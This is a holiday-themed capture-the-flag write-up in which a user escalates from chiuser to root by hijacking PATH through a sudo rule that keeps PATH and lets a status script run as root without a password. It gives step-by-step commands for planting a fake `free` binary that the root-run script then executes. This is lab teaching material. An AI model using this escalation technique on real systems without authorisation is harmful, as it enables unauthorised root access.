# ❄️ Challenge 2: Fire Alarm Privilege Escalation ❄️

## 🔥 The Gnome Mischief 🔥

Those mischievous gnomes locked us out of the Dosis Neighborhood fire alarm system! They revoked admin privileges and left poor `chiuser` with only standard access. Time to outsmart those pointy-hatted troublemakers!

---

## ❄️ The Mission ❄️

Escalate privileges from `chiuser` to root and run `/etc/firealarm/restore_fire_alarm` to save the neighborhood!

---

## 🎄 Reconnaissance 🎄

### Check sudo permissions
```bash
sudo -l
```

**Discovery:** User can run `/usr/local/bin/system_status.sh` as root with NOPASSWD!

### Examine the script
```bash
cat /usr/local/bin/system_status.sh
```

**Finding:** The script calls commands like `free`, `df`, `w`, `ps` without full paths!

### Check environment
```bash
env
```

**Jackpot:** `PATH=/home/chiuser/bin:/usr/local/sbin:...` AND `env_keep+=PATH` is set!

---

## ❄️ The Attack: PATH Hijacking ❄️

Since `/home/chiuser/bin` is first in PATH and sudo preserves the PATH variable, we can create a malicious `free` command!

### Step 1: Create bin directory
```bash
mkdir -p /home/chiuser/bin
```

### Step 2: Create malicious `free` command
```bash
echo '#!/bin/bash' > /home/chiuser/bin/free && echo '/etc/firealarm/restore_fire_alarm' >> /home/chiuser/bin/free
```

### Step 3: Make it executable
```bash
chmod +x /home/chiuser/bin/free
```

### Step 4: Trigger the exploit
```bash
sudo /usr/local/bin/system_status.sh
```

---

## 🎅 Victory! 🎅

When `system_status.sh` runs as root and calls `free`, it executes OUR `free` from `/home/chiuser/bin` instead of `/usr/bin/free`, running the fire alarm restore command with root privileges!

**The gnomes have been defeated! The fire alarm system is restored!** 🔥🚨

---

## ❄️ Technical Summary ❄️

| Item | Details |
|------|---------|
| Vulnerability | PATH Hijacking via sudo env_keep |
| Attack Vector | Malicious binary in user-controlled PATH directory |
| Privilege Level | root (via NOPASSWD sudo) |
| Key Finding | `env_keep+=PATH` combined with user-writable PATH directory |

---

*Don't let the gnomes catch you slipping!* ⛄❄️🎄
